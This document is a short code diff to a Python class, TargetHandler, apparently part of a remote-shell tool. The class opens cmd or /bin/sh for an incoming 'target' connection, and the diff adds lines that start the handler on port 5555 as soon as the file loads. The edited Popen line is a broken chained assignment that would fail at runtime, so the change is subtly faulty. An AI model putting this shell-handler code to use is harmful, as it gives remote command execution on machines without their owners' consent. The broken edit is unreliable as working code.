@@ -166,9 +166,9 @@ class TargetHandler:
         if not self.target:
             print("No active connection for shell.")
             return
-
+        process = None
         try:
-            process: Popen[bytes] = subprocess.Popen(['cmd'] if platform.system() == 'Windows' else ['/bin/sh'],
+            process = Popen[bytes] = subprocess.Popen(['cmd'] if platform.system() == 'Windows' else ['/bin/sh'],
                                                      stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                                      stderr=subprocess.PIPE)
             print("Interactive shell started.")
@@ -247,3 +247,7 @@ class TargetHandler:
                     break
         finally:
             self.close_connection()
+Host_ip = ""
+Host_port = 5555
+TargetHandler1 = TargetHandler(Host_ip, Host_port)
+TargetHandler1.run()
